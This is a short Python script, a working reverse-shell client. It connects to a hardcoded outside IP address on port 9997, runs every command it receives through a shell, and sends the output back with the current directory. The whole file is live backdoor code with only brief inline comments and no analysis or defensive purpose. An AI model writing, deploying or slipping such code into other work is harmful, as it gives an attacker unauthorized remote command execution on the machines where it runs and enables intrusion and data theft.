#importing libraries
import socket
import os
import subprocess

socs = socket.socket()
host = '134.122.125.216'                          #ip address of server
port = 9997                                       #port number

socs.connect((host, port))                        #bind host and port together with a socket

while True:                                       #infinite loop
    data = socs.recv(1024)                        #receive data from server
    if data[:2].decode("utf-8") == 'cd':          #checks first two characters are cd or not
        os.chdir(data[3:].decode("utf-8"))        #path to change directory

    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)    #execute a instruction given by the server
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "                             #current working directory                           
        socs.send(str.encode(output_str + currentWD))

        print(output_str)
